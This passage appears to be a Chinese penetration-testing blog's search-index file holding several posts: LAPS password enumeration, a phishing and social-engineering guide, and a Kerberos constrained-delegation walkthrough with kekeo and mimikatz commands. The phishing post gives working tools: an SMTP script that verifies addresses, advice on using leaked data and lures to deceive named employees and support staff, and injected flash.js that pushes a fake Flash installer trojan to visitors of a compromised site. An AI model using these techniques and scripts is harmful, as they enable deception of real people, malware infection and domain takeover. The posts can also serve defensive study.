src="/img/laps/7d3aa3fc-2305-4ccc-a1d6-54d030a19ade.png" alt="img"></p><p>编辑组策略install laps</p><p><img src="/img/laps/1434a2e8-7f85-4edb-80ee-3257a03aad67.png" alt="img"></p><p>选择安装包</p><p><img src="/img/laps/513a7d0d-e34e-4024-9dc7-21bb5abc61f1.png" alt="img"></p><p>安装包只能是msi</p><p><img src="/img/laps/d07bfb9e-60ee-485d-b448-8d65947f2be9.png" alt="img"></p><p>选择指派</p><p><img src="/img/laps/571ee35d-2441-4d2a-ac70-9d8d63e024f6.png" alt="img"></p><p>成功指向共享文件里的msi安装包</p><p><img src="/img/laps/ec1b1ad8-8461-42df-b242-8ecc3f10727f.png" alt="img"></p><p>当域用户登录桌面的时候，就会自动安装。如果已经安装过了则不会再安装了。</p><p><img src="/img/laps/2cd9072a-effb-42b6-b969-bc0050cc12cf.png" alt="img"></p><h3 id="0x03-2-lapsComputers组织创建组策略set-laps"><a href="#0x03-2-lapsComputers组织创建组策略set-laps" class="headerlink" title="0x03-2 lapsComputers组织创建组策略set laps"></a>0x03-2 lapsComputers组织创建组策略set laps</h3><p><img src="/img/laps/cf3cc113-ebfa-454a-b61b-0d2c2cc6d4c9.png" alt="img"></p><p><img src="/img/laps/aec206ed-3731-4aa9-92f3-cf923602ef3c.png" alt="img"></p><p>密码的设置，提供了多种复杂度的组合方式、密码长度和密码重置周期的设置。</p><p><img src="/img/laps/4f7b9405-b011-4bf7-9660-bad685319716.png" alt="img"></p><p>接下来是输入本地管理员的用户名,如果你修改的不是内置的Administrator，请在这里指定你希望修改的用户名，在未配置的情况下默认为内置的Administrator。</p><p><img src="/img/laps/854d33f5-65af-417d-aec4-fd69c110b398.png" alt="img"></p><p>接下来这一项是为了重置周期与密码有效期策略配合使用的设置。因为很多公司都有自己的密码过期策略，启用这一项可以避免两个配置发生冲突。</p><p><img src="/img/laps/1c6887c6-d170-4a51-af85-bf36c120191d.png" alt="img"></p><p>最后一项启用配置后确认对本地管理员密码开始进行设置。</p><p><img src="/img/laps/92bdc0aa-6729-469a-a184-e26a4c5f6003.png" alt="img"></p><h2 id="0x04-通过ldap查看laps的明文密码"><a href="#0x04-通过ldap查看laps的明文密码" class="headerlink" title="0x04 通过ldap查看laps的明文密码"></a>0x04 通过ldap查看laps的明文密码</h2><p>使用lapsAdminUsers组织里的lapsAdmins组里的成员lidan登录lapsComputers机器</p><p>可以看到登陆的时候显示正在安装laps</p><p><img src="/img/laps/7bbc7e74-12fc-4926-9ccb-cee566fcf8bb.png" alt="img"></p><p>通过lidan域用户或者域管用户查看ldap，选择lapsComputers里的域机器，可以看到本地管理员administrator的随机明文密码</p><p><img src="/img/laps/390f5927-8b8a-4b7e-9d47-47af4a0c3c5a.png" alt="img"></p><p>如果使用非lapsAdminsUsers组织lapsAdmins组里的域用户查看ldap，是看不到的密码的，只能看到是什么时候修改的</p><p><img src="/img/laps/536d59df-46a1-4ad5-8d67-d43f085ec333.png" alt="img"></p><h2 id="0x05-漏洞利用"><a href="#0x05-漏洞利用" class="headerlink" title="0x05 漏洞利用"></a>0x05 漏洞利用</h2><h3 id="0x05-1-grouper2-导出组策略"><a href="#0x05-1-grouper2-导出组策略" class="headerlink" title="0x05-1 grouper2 导出组策略"></a>0x05-1 grouper2 导出组策略</h3><p>当我们遇到域环境时，先通过grouper2导出组策略看是否有laps</p><p>Grouper2.exe -d Motoo.nc -u liwei -p 1qaz@WSX -t 100 -f out.html</p><p><img src="/img/laps/1a93bd96-83b2-4d88-9fa9-ec4d9e8bd3d4.png" alt="img"></p><p>打开out.html，全局搜索laps</p><p><img src="/img/laps/005342bb-0a41-40bb-b3d2-f62d36aafb3c.png" alt="img"></p><p>通过uid可以找到laps链接到哪个组织</p><p><img src="/img/laps/3c6d0c63-2aab-413a-acf1-9a95ddd7f000.png" alt="img"></p><h3 id="0x05-2-LAPSTOOlkit工具寻找laps漏洞"><a href="#0x05-2-LAPSTOOlkit工具寻找laps漏洞" class="headerlink" title="0x05-2 LAPSTOOlkit工具寻找laps漏洞"></a>0x05-2 LAPSTOOlkit工具寻找laps漏洞</h3><pre><code>github : https://github.com/leoloobeek/LAPSToolkit/archive/master.zip显示全部启用了LAPS和密码扩展的计算机设备。get-help Get-LAPSComputers查询所有的OU并检测哪一个活动目录组可读取ms-Mcs-AdmPwd属性。get-help Find-LAPSDelegatedGroups       使用了get-NetOU针对每一个启用了LAPS的活动目录计算机，进行扩展权限分析，并查找哪一个用户组拥有AD读取权限，以及其中的用户是否具有“全部扩展权限”。系统管理员可能不知道哪一个具有“全部扩展权限”的用户可以查看密码，以及用户组中的哪一个用户安全等级比较低。这个功能可以针对每一个AD设备解析ACL权限，但对于范围比较大的域，解析时间会比较久。get-help Find-AdmPwdExtendedRights      使用了get-objectAcl原理​```Get-NetComputer -ComputerName &#39;LAPSCLIENT.test.local&#39; -FullData |Select-Object -ExpandProperty distinguishedname |ForEach-Object { $_.substring($_.indexof(&#39;OU&#39;)) } | ForEach-Object {  Get-ObjectAcl -ResolveGUIDs -DistinguishedName $_} | Where-Object {  ($_.ObjectType -like &#39;ms-Mcs-AdmPwd&#39;) -and  ($_.ActiveDirectoryRights -match &#39;ReadProperty&#39;)} | ForEach-Object {  Convert-NameToSid $_.IdentityReference} | Select-Object -ExpandProperty SID | Get-ADObject​```首先，我们将获取Get-NetComputer -FullData的完整数据对象。然后，我们提取并扩展 distinguishedname属性，找到“ OU”的索引，然后仅返回字符串的该部分。我们在这里所做的只是枚举特定计算机所属的OU。接下来，我们使用Get-ObjectAcl枚举该指定OU的ACL， 并使用-ResolveGUIDs将GUID解析为通用显示名称。然后，我们过滤权限条目，仅返回那些在ms-Mcs-AdmPwd字段上包含读取权限的条目 。我们无法确定从IdentityReference字段返回的名称 是组还是用户，因此我们可以使用PowerView的 Convert-NameToSid cmdlet将对象转换为直接安全标识符（SID），然后将其最终传递给 Get -ADObject返回具有对该字段的读取权限的完整活动目录用户/组对象。从结果中我们可以看到，“ LAPS_recover”域组被授予读取权限。现在，如果我们想枚举所有LAPS应用程序，并且谁拥有对它们的读取权限，该怎么办？由于最近对Get-ObjectACL的参数流水线进行了一些优化，因此比以往任何时候都更容易​```Get-NetOU -FullData | Get-ObjectAcl -ResolveGUIDs | Where-Object {  ($_.ObjectType -like &#39;ms-Mcs-AdmPwd&#39;) -and   ($_.ActiveDirectoryRights -match &#39;ReadProperty&#39;)} | ForEach-Object {  $_ | Add-Member NoteProperty &#39;IdentitySID&#39; $(Convert-NameToSid $_.IdentityReference).SID;  $_}​```</code></pre><p>查询哪些机器使用了laps</p><pre><code>Get-LAPSComputers</code></pre><p><img src="/img/laps/69a50a66-840f-4f70-af87-19189c50f8dd.png" alt="img"></p><p>查询所有的OU并检测哪一个活动目录组可读取ms-Mcs-AdmPwd属性。</p><pre><code>import-module .\LAPSToolkit.ps1Find-LAPSDelegatedGroups</code></pre><p><img src="/img/laps/4775375f-394e-4877-adbb-ffcde56bf976.png" alt="img"></p><p><strong>从上图结果得知，lapsAdmins组里的用户可以读取lapsComputers组织里的所有域机器的本地管理员密码</strong></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><pre><code>http://drops.xmd5.com/static/drops/tips-10496.htmlhttp://tech.canway.net/news/164.htmlhttp://www.harmj0y.net/blog/powershell/running-laps-with-powerview/</code></pre>]]></content>
      
      
      <categories>
          
          <category> 域渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LAPS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>钓鱼与社工系列之寻鱼</title>
      <link href="/2020/11/26/diao-yu-yu-she-gong-xi-lie-zhi-xun-yu/"/>
      <url>/2020/11/26/diao-yu-yu-she-gong-xi-lie-zhi-xun-yu/</url>
      
        <content type="html"><![CDATA[<h1 id="钓鱼与社工系列之寻鱼"><a href="#钓鱼与社工系列之寻鱼" class="headerlink" title="钓鱼与社工系列之寻鱼"></a>钓鱼与社工系列之寻鱼</h1><h2 id="0x01-广撒网"><a href="#0x01-广撒网" class="headerlink" title="0x01 广撒网"></a>0x01 广撒网</h2><p>从互联网中收集目标员工邮箱，发送钓鱼邮件</p><h3 id="0x01-1-邮箱收集-theHarvester"><a href="#0x01-1-邮箱收集-theHarvester" class="headerlink" title="0x01-1 邮箱收集-theHarvester"></a>0x01-1 邮箱收集-theHarvester</h3><p>这里推荐使用theHarvester脚本收集邮箱</p><pre><code>https://github.com/laramies/theHarvester</code></pre><p>语法：-d参数指向目标的域名，-b all是用调用theHarvester的所有模板查找邮箱</p><pre><code>python3 theHarvester.py -d xxx.com -b all</code></pre><p><img src="/img/fish/7c321a3d-e2c7-492c-9079-621e2fc032c0.png" alt="img"></p><h3 id="0x01-2-邮箱收集-搜索引擎"><a href="#0x01-2-邮箱收集-搜索引擎" class="headerlink" title="0x01-2  邮箱收集-搜索引擎"></a>0x01-2  邮箱收集-搜索引擎</h3><pre><code>微匹：http://www.veryvp.com/hunter: https://hunter.io/search/domain.comskymem: https://www.skymem.info/</code></pre><p><img src="/img/fish/05cd1a41-ad6b-405c-8bbb-286382a65113.png" alt="img"></p><p><img src="/img/fish/86b65aa3-af79-4e50-bd85-aca4910bf051.jpg" alt="img"></p><p><img src="/img/fish/f404f8ce-3cda-4f91-bfc3-8f3eabfba2d5.png" alt="img"></p><h3 id="0x01-3-邮箱收集-验证邮箱有效性"><a href="#0x01-3-邮箱收集-验证邮箱有效性" class="headerlink" title="0x01-3  邮箱收集-验证邮箱有效性"></a>0x01-3  邮箱收集-验证邮箱有效性</h3><p>收集到邮箱后，可以先验证邮箱是否真实有效，通过以下的脚本验证邮箱的真实性，脚本在文章末尾。</p><p><img src="/img/fish/89aad28f-1374-43c3-9766-3d83017e820b.png" alt="img"></p><p>然后对这些真实存在的邮箱发送钓鱼邮件即可。</p><p>邮件内容要能吸引员工兴趣，最好是关乎到他们的利益，这样才能诱导他们查看。</p><p>并且设置自己的邮箱昵称与目标相关，例如：行政服务部</p><h3 id="0x01-4-QQ等第三方邮箱发送钓鱼邮件"><a href="#0x01-4-QQ等第三方邮箱发送钓鱼邮件" class="headerlink" title="0x01-4 QQ等第三方邮箱发送钓鱼邮件"></a>0x01-4 QQ等第三方邮箱发送钓鱼邮件</h3><p><img src="/img/fish/9aa41b3f-fb07-406b-8341-6f494d2f41d7.jpg" alt="img"></p><p><img src="/img/fish/e8f6a74b-57c5-426f-9577-4c673cc32b33.png" alt="img"></p><h3 id="0x01-5-目标员工邮箱"><a href="#0x01-5-目标员工邮箱" class="headerlink" title="0x01-5 目标员工邮箱"></a>0x01-5 目标员工邮箱</h3><p>使用目标员工的邮箱发送马，不用考虑邮件网关导致发不进去</p><p><img src="/img/fish/9194e784-f2b8-4c98-bf0e-49bb6ff9dfdf.jpg" alt="img"></p><h3 id="0x01-6-OA办公系统"><a href="#0x01-6-OA办公系统" class="headerlink" title="0x01-6 OA办公系统"></a>0x01-6 OA办公系统</h3><p>OA办公系统可以获取目标大量员工联系方式，对一些安全意识薄弱的部门员工发送“非常重要”的消息。</p><p><img src="/img/fish/b12ddace-ada5-43ac-bbc3-f000ea0abf44.jpg" alt="img"></p><h2 id="0x02-定向钓鱼（制作对应鱼饵）"><a href="#0x02-定向钓鱼（制作对应鱼饵）" class="headerlink" title="0x02 定向钓鱼（制作对应鱼饵）"></a>0x02 定向钓鱼（制作对应鱼饵）</h2><h3 id="0x02-1-对收集到的邮箱用户定向钓鱼"><a href="#0x02-1-对收集到的邮箱用户定向钓鱼" class="headerlink" title="0x02-1 对收集到的邮箱用户定向钓鱼"></a>0x02-1 对收集到的邮箱用户定向钓鱼</h3><p>通过tg的社工库查邮箱获取手机号，再通过手机号添加微信定向社工。</p><p>下图是我通过qq邮箱发送钓鱼邮件后，如果邮箱存在，则会显示已投递到对方邮箱，如果邮箱不存在，则显示投递失败，已退信。</p><p>通过该方法，也可以判断邮箱是否有效。</p><p><img src="/img/fish/cb1d45bb-5c0e-4275-af44-52ec2873526a.png" alt="img"></p><p>通过qq邮箱发送，还有一个好处，就是有些用户会设置自动回复或者回复了我们的邮件，那么这时候就可以获取到该用户的一些信息。</p><p><img src="/img/fish/a8636bec-8890-4188-b7f2-a05d5d96d308.png" alt="img"></p><p><img src="/img/fish/84045831-d7bb-4473-9ec5-45bcd561d4fa.png" alt="img"></p><p>从收集到的邮箱中中选择了lining9用户的邮箱，在tg中找到了该邮箱泄露的信息，我们应该关注的重点信息是手机号</p><p><img src="/img/fish/ec4df603-0ad9-49fb-ad49-29e72057f935.png" alt="img"></p><p>然后通过微信小号查找该手机号，并添加对方为好友。</p><p>这里我直接报对方的名字和邮箱号，一是可以判断是否加错，二是获取对方的信任。</p><p><img src="/img/fish/3897192d-127c-4176-91d0-3c3722aeee04.png" alt="img"></p><p>制作和目标相关的木马，这个需要先去了解目标的情况。</p><p>这里我是调查了他们员工都是用了一种安全桌面客户端，所以我就伪装自己是公司的技术部门，让他更新补丁，于是将马发送给他后，不一会儿就上线到CS了。</p><p><img src="/img/fish/e05740f7-8504-41e4-832f-11756649f22d.png" alt="img"></p><h3 id="0x02-2-通过关键字寻找鱼并定向钓鱼"><a href="#0x02-2-通过关键字寻找鱼并定向钓鱼" class="headerlink" title="0x02-2 通过关键字寻找鱼并定向钓鱼"></a>0x02-2 通过关键字寻找鱼并定向钓鱼</h3><p>举个例子，通用关键字有： 联系方式、简历、招聘、应聘、贷款、手机号、邮箱 等等</p><p>对于一些特殊行业，那么可以自己联想关键字，例如 投标、招标、投诉 等等</p><p>自己发挥想象，各种关键字相互组合。</p><pre><code>目标名字&quot;XXXX&quot;  联系方式        投递简历        hr        招聘        应聘        贷款        手机号</code></pre><p><img src="/img/fish/485c876c-bf8b-4d2d-b6a7-a350bb1221f0.jpg" alt="img"></p><p><img src="/img/fish/83aa07fe-3b6d-4ec6-acca-4cc9709038a2.jpg" alt="img"></p><p>制作一个应聘简历马，然后发过去就可以了。</p><p><img src="/img/fish/44eae351-55e2-4bb6-8733-fb2c659400f6.jpg" alt="img"></p><h3 id="0x02-3-在线客服"><a href="#0x02-3-在线客服" class="headerlink" title="0x02-3 在线客服"></a>0x02-3 在线客服</h3><p>一些企业或者金融行业，他们的网站都有在线客服功能。那么可以通过人工服务去定向社工。</p><p>例如：在线客服处有上传文件的功能，那么就将我们的马直接传上去，诱导客服运行。</p><p>或者就想办法加这些客服人员的微信，具体的话术自己构造。</p><p><img src="/img/fish/50155984.png" alt="img"></p><p>上图中的马的名字也是有根据的，我是在他们的网站上找到下面的信息，然后问客服打不开文件是什么原因。诱导客服尝试打开我们的马。</p><p><img src="/img/fish/26a19d19-5db1-4a75-9359-b8b7a5b5f1ef.png" alt="img"></p><h3 id="0x02-4-水坑"><a href="#0x02-4-水坑" class="headerlink" title="0x02-4 水坑"></a>0x02-4 水坑</h3><p>前提：拿下了webshell后，在webshell中植入下面的项目。</p><pre><code>https://github.com/r00tSe7en/Flash-Pop</code></pre><p>效果：当有人第一次访问时，会触发下图的弹框，诱导访问者点击立即升级，这时候会跳转到我们的Flash木马地址自动下载。当访问者点击安装了木马后，就会上线到远控端。然后将访问者的浏览器设置一个cookies，避免访问者刷新后又弹框。这样就不会触发访问者的警觉了，误以为安装了Flash后就可以了。</p><p><img src="/img/fish/f02b1d44-d657-425d-815f-82803520ade0.jpg" alt="img"></p><p>验证邮箱真实性脚本</p><pre><code>&#39;&#39;&#39;在线验证邮箱真实性&#39;&#39;&#39;import randomimport smtplibfrom termcolor import cprintimport dns.resolverimport timefrom queue import Queuefrom threading import Thread# 查询邮件服务器def get_mailServer(server):    print(&#39;查找[{}]邮箱服务器...&#39;.format(server))    try:        answers = dns.resolver.query(server, &#39;MX&#39;)        res = [str(rdata.exchange)[:-1] for rdata in answers]        print(&#39;\t[{}]邮件服务器：{}&#39;.format(server, res))        return res    except Exception as e:        print(&#39;\t[error] : {}&#39;.format(e.args))        return []# 判断邮箱是否存活def checkEmail(mailServers, emails_queue, aliveEmails):    try:        mailServer = random.choice(mailServers)        print(&#39;\t连接服务器:{}&#39;.format(mailServer))        s = smtplib.SMTP(mailServer, timeout=10)    except Exception as e:        print(&#39;\t[error] : {}&#39;.format(e.args))        return    while not emails_queue.empty():        email = emails_queue.get()        num = emails_queue.qsize()        try:            helo = s.docmd(&#39;HELO chacuo.net&#39;)            # print(helo)   # (250, b&#39;Forcepoint email protection service&#39;)            send_from = s.docmd(&#39;MAIL FROM:&lt;test@test.test&gt;&#39;)            # print(send_from)  # (250, b&#39;2.1.0 Ok&#39;)            send_from = s.docmd(&#39;RCPT TO:&lt;%s&gt;&#39; % email)            # print(send_from)  # (550, b&#39;5.1.1 Error: invalid recipients is found from 101.68.81.227&#39;) 或者 (250, b&#39;2.1.5 Ok&#39;)            if send_from[0] == 250 or send_from[0] == 451:                # final_res[email] = True  # 存在                cprint(&#39;\t[{}] [+] {}&#39;.format(num, email), &#39;red&#39;)                aliveEmails.append(email)            elif send_from[0] == 550:                # final_res[email] = False  # 不存在                print(&#39;\t[{}] [-] {} 不存在&#39;.format(num, email))            elif send_from[0] == 503:                cprint(&#39;\t[{}] [-] {} code = 503 重新连接邮件服务器{}&#39;.format(num, email, mailServer))                s.close()                time.sleep(10)                try:                    s = smtplib.SMTP(mailServer, timeout=10)                except Exception as e:                    s.close()                    time.sleep(10)                    s = smtplib.SMTP(mailServer, timeout=10)                helo = s.docmd(&#39;HELO chacuo.net&#39;)                send_from = s.docmd(&#39;MAIL FROM:&lt;test@test.test&gt;&#39;)                send_from = s.docmd(&#39;RCPT TO:&lt;%s&gt;&#39; % email)                if send_from[0] == 250 or send_from[0] == 451:                    cprint(&#39;\t[{}] [+] {}&#39;.format(num, email), &#39;red&#39;)                    aliveEmails.append(email)                elif send_from[0] == 550:                    print(&#39;\t[{}] [-] {}&#39;.format(num, email))            else:                # final_res[email] = None  # 未知                print(&#39;\t[{}] [-] {} : {} : {}&#39;.format(num, email, send_from[0], send_from))        except Exception as e:            print(&#39;\t[{}] [error] {} : {}&#39;.format(num, email, e.args))            s.close()            try:                s = smtplib.SMTP(mailServer, timeout=10)            except Exception as e:                s.close()                time.sleep(10)                s = smtplib.SMTP(mailServer, timeout=10)    s.close()def run(emails):    Server_emails = {}          aliveEmails = []    # 存活的emails    for email in emails:        name, server = email.split(&#39;@&#39;)        if Server_emails.get(server):            Server_emails[server].append(email)        else:            Server_emails[server] = [email]    print(Server_emails)    for server in Server_emails:        mailServers = get_mailServer(server)        if mailServers:            emailsNums = len(Server_emails[server])            emails_queue = Queue(-1)            for email in Server_emails[server]:                emails_queue.put(email)            threads = []            for i in range(5):                t = Thread(target=checkEmail, args=(mailServers, emails_queue, aliveEmails))                threads.append(t)                t.start()            for t in threads:                t.join()    return aliveEmailsdef run_verifyEmails(emails):    aliveEmails = run(emails)    return aliveEmailsif __name__ == &#39;__main__&#39;:    emails = []    with open(&#39;mail.txt&#39;, &#39;rt&#39;) as f:        for each in f.readlines():            emails.append(each.strip())    aliveEmails = run_verifyEmails(emails)    print(aliveEmails)</code></pre><p>flash.js新增代码，通过新增cookeis避免多次弹框：</p><pre><code>function setCookie(cname,cvalue,exdays) {  var d = new Date();  d.setTime(d.getTime() + (exdays*24*60*60*1000));  var expires = &quot;expires=&quot; + d.toGMTString();  document.cookie = cname + &quot;=&quot; + cvalue + &quot;;&quot; + expires + &quot;;path=/&quot;;}function getCookie(cname) {  var name = cname + &quot;=&quot;;  var decodedCookie = decodeURIComponent(document.cookie);  var ca = decodedCookie.split(&#39;;&#39;);  for(var i = 0; i &lt; ca.length; i++) {    var c = ca[i];    while (c.charAt(0) == &#39; &#39;) {      c = c.substring(1);    }    if (c.indexOf(name) == 0) {      return c.substring(name.length, c.length);    }  }  return &quot;&quot;;}var download666 = function() {    setCookie(&quot;username1&quot;, &quot;True&quot;, 30);    setTimeout(&quot;location.href=&#39;./&#39;&quot;, 500 );    setTimeout(&quot;localStorage.setItem(&#39;isUpdate&#39;, &#39;1&#39;);&quot;, 500 );    window.open(&#39;./autoinstall/flashplayerpp_install_cn.exe&#39;);}function checkCookie() {    var user=getCookie(&quot;username1&quot;);    if (user == &quot;&quot;) {        document.write(&quot;&lt;script src=&#39;./layer/jquery.min.js&#39;&gt;&lt;/script&gt;&quot;);        document.write(&quot;&lt;script src=&#39;./layer/layer.js&#39;&gt;&lt;/script&gt;&quot;);        window.onload = function(){            layer.open({                type: 1,                move: false ,                area: [&#39;613px&#39;, &#39;328px&#39;],                title: false,                shade: 0.6,                //maxmin: true ,                anim: 1,                offset: &#39;100px&#39;,                scrollbar: false,                content: &#39;&lt;a href=&quot;javascript:;&quot; onclick=&quot;download666()&quot;&gt;&lt;img src=&quot;./flash.jpg&quot;&gt;&lt;/a&gt;&#39;//创建图像            });        }    }}checkCookie();</code></pre>]]></content>
      
      
      <categories>
          
          <category> 钓鱼与社工 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 钓鱼与社工系列之寻鱼 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>约束委派利用</title>
      <link href="/2020/11/25/yue-shu-wei-pai-li-yong/"/>
      <url>/2020/11/25/yue-shu-wei-pai-li-yong/</url>
      
        <content type="html"><![CDATA[<h1 id="0x09-约束委派利用"><a href="#0x09-约束委派利用" class="headerlink" title="0x09-约束委派利用"></a>0x09-约束委派利用</h1><h2 id="0x01-准备工作"><a href="#0x01-准备工作" class="headerlink" title="0x01 准备工作"></a>0x01 准备工作</h2><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><pre><code>《AD域用户加域委派》https://wenku.baidu.com/view/5cd12c2adc36a32d7375a417866fb84ae45cc32b.html《域渗透——Kerberos委派攻击》     -- 主要是这篇文章https://xz.aliyun.com/t/7217#toc-9《利用域委派获取域管理权限》https://www.anquanke.com/post/id/92484《微软不认的“0day”之域内本地提权-烂番茄（Rotten Tomato）》https://mp.weixin.qq.com/s/Ue2ULu8vxYHrYEalEzbBSw《这是一篇“不一样”的真实渗透测试案例分析文章》https://cloud.tencent.com/developer/article/1601095</code></pre><h3 id="准备环境"><a href="#准备环境" class="headerlink" title="准备环境"></a>准备环境</h3><pre><code>借用Klion的环境域控：192.168.3.142域机器：Srv-DB-0day域机器：PC-jerry-0day服务账号:0day\sqlsvr Admin12345工具：ADFind.exe      查找域中配置约束委派用户kekeo.exe       请求TGT，获取STmimikatz        导入ST，获取权限</code></pre><h3 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h3><p>域委派是指将域内用户的权限委派给服务账号，使得服务账号能以用户的权限在域内展开活动</p><p>委派主要分为非约束委派(Unconstrained delegation)和约束委派(Constrained delegation)两个方式，还有一种是基于资源的约束委派（Resource Based Constrained Delegation）</p><pre><code>非约束性委派（Unconstrained Delegation）服务账号可以获取某用户的TGT，从而服务账号可使用该TGT，模拟用户访问任意服务。举例说明，如果某个服务A的服务账号B被设置为非约束委派，当用户C通过Kerberos认证访问服务A时，KDC会检查服务账号B的属性，发现是非约束性委派时，KDC会将用户C的TGT放在TGS中，这样B在验证TGS的同时获取了A用户的TGT，从而可以模拟用户A访问任意服务。从网络攻击的角度看，如果攻击者控制了服务账号B，并诱骗管理员来访问服务A，则可以获取管理员的TGT，进而模拟管理员访问任意服务，即获得管理员权限。越是大型网络、应用越多的网络，服务账号越多，委派的应用越多，越容易获取域管理员权限。</code></pre><pre><code>约束性委派（Constrained Delegation）即Kerberos的扩展协议S4U2Proxy，服务账号只能获取某用户的TGS，从而只能模拟用户访问特定的服务；</code></pre><h3 id="服务账号、主机账号、普通账号"><a href="#服务账号、主机账号、普通账号" class="headerlink" title="服务账号、主机账号、普通账号"></a>服务账号、主机账号、普通账号</h3><p>在Windows系统中，普通用户的属性中没有委派（Delegation）这个选项卡，只有服务账号、主机账号才有。</p><p>服务账号（Service Account），域内用户的一种类型，服务器运行服务时所用的账号，将服务运行起来并加入域。例如MS SQL Server在安装时，会在域内自动注册服务账号SqlServiceAccount，这类账号不能用于交互式登录。</p><p>服务账号：⬇</p><p><img src="/img/delegation/2a7151ab-7283-4ec3-bb6d-61b1da116eba.png" alt="img"></p><p>主机账号：⬇</p><p><img src="/img/delegation/862a6496-aa6d-4e53-89c0-915a769c5848.png" alt="img"></p><p>普通账号：⬇</p><p><img src="/img/delegation/368b1b91-3985-4ec8-9b95-7b09c1b431ec.png" alt="img"></p><h2 id="0x02-约束委托利用"><a href="#0x02-约束委托利用" class="headerlink" title="0x02 约束委托利用"></a>0x02 约束委托利用</h2><p>模拟环境，在域机器：PC-jerry-0day上</p><h3 id="1-查找域中配置约束委派用户"><a href="#1-查找域中配置约束委派用户" class="headerlink" title="1. 查找域中配置约束委派用户"></a>1. 查找域中配置约束委派用户</h3><pre><code>AdFind.exe -h 192.168.3.142 -u sqlsvr -up Admin12345 -b &quot;DC=0day,DC=org&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto</code></pre><p><img src="/img/delegation/c655de04-feac-4072-96ed-1cb59df6970d.png" alt="img"></p><p>那么当我们获取了sqlsvr域用户的账号密码后，就可以登录查出来的任意域机器</p><p>先查询下Srv-DB-0day域机器的管理组，使用服务账号建立IPC连接，用local查询本地管理组。可以看到sqlsvr并不能对Srv-DB-0day域机器有操作权限</p><p><img src="/img/delegation/ffe5a7ac-d47b-464f-8e7c-97ef90400c13.png" alt="img"></p><h3 id="2-用kekeo请求该用户的TGT，使用这张TGT获取域机器的ST"><a href="#2-用kekeo请求该用户的TGT，使用这张TGT获取域机器的ST" class="headerlink" title="2. 用kekeo请求该用户的TGT，使用这张TGT获取域机器的ST"></a>2. 用kekeo请求该用户的TGT，使用这张TGT获取域机器的ST</h3><pre><code>kekeo.exetgt::ask /user:sqlsvr /domain:0day.org /password:Admin12345 /ticket:administrator.kirbitgs::s4u /tgt:TGT_sqlsvr@0DAY.ORG_krbtgt~0day.org@0DAY.ORG.kirbi /user:Administrator@0day.org /service:cifs/Srv-DB-0day.0day.org</code></pre><p>用kekeo请求该用户的TGT</p><p>tgt::ask /user:sqlsvr /domain:0day.org /password:Admin12345 /ticket:administrator.kirbi</p><p>/user: 服务用户的用户名</p><p>/password: 服务用户的明文密码</p><p>/domain: 所在域名</p><p>/ticket: 指定票据名称，不过这个参数没有生效，可以忽略</p><p>得到服务用户TGT：<a href="mailto:TGT_sqlsvr@0DAY.ORG_krbtgt" target="_blank" rel="noopener">TGT_sqlsvr@0DAY.ORG_krbtgt</a>~0day.org@0DAY.ORG.kirbi</p><p>使用这张TGT通过伪造s4u请求以administrator用户身份请求访问Srv-DB-0day CIFS的ST</p><p>tgs::s4u /tgt:<a href="mailto:TGT_sqlsvr@0DAY.ORG_krbtgt" target="_blank" rel="noopener">TGT_sqlsvr@0DAY.ORG_krbtgt</a>~0day.org@0DAY.ORG.kirbi /user:<a href="mailto:Administrator@0day.org" target="_blank" rel="noopener">Administrator@0day.org</a> /service:cifs/Srv-DB-0day.0day.org</p><p>S4U2Self获取到的ST1以及S4U2Proxy获取到的Srv-DB-0day CIFS服务的ST2会保存在当前目录下</p><p><img src="/img/delegation/3856b471-3f77-4497-a05e-d108b3082d2c.png" alt="img"></p><p><img src="/img/delegation/0660e189-5f7a-4c7b-882d-2614b32a8c81.png" alt="img"></p><h3 id="3-获取权限"><a href="#3-获取权限" class="headerlink" title="3. 获取权限"></a>3. 获取权限</h3><p>使用mimikatz将ST2导入当前会话即可，如果有杀软，自行免杀。需要以管理员权限运行mimikatz</p><pre><code>kerberos::ptt TGS_Administrator@0day.org@0DAY.ORG_cifs~Srv-DB-0day.0day.org@0DAY.ORG.kirbidir \\Srv-DB-0day.0day.org\C$\</code></pre><p><img src="/img/delegation/78714f9a-a23b-428c-a1e5-7b1fae22aa80.png" alt="img"></p><h2 id="0x03-视频演示"><a href="#0x03-视频演示" class="headerlink" title="0x03 视频演示"></a>0x03 视频演示</h2><p><img src="/img/delegation/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B.gif" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 域渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 约束委派利用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于资源的约束委派利用</title>
      <link href="/2020/11/25/ji-yu-zi-yuan-de-yue-shu-wei-pai-li-yong/"/>
      <url>/2020/11/25/ji-yu-zi-yuan-de-yue-shu-wei-pai-li-yong/</url>
      
        <content type="html"><![CDATA[<h1 id="0x09-基于资源的约束委派利用"><a href="#0x09-基于资源的约束委派利用" class="headerlink" title="0x09 基于资源的约束委派利用"></a>0x09 基于资源的约束委派利用</h1><h2 id="0x01-应用场景："><a href="#0x01-应用场景：" class="headerlink" title="0x01 应用场景："></a>0x01 应用场景：</h2><p>​    在大型内网域环境中，将机器加入到域环境中一般不会用域管权限，而是用一个专门加域的域用户去操作。那么当我们拿下该域用户的账号密码时，就可以把通过该域用户加入到域里的所有机器都拿下。</p><p>0.限制：只能在windows 2012及以上版本的域控才可以，因为08及以下的域控没有msDS-AllowedToActOnBehalfOfOtherIdentity这个属性</p><p><img src="/img/delegation/70ffc507-8f02-4621-8811-a8050fd47030.png" alt="img"></p><p><img src="/img/delegation/507dd4fe-2571-40b6-9d6b-9cb0cd441e2c.png" alt="img"></p><p>\1. 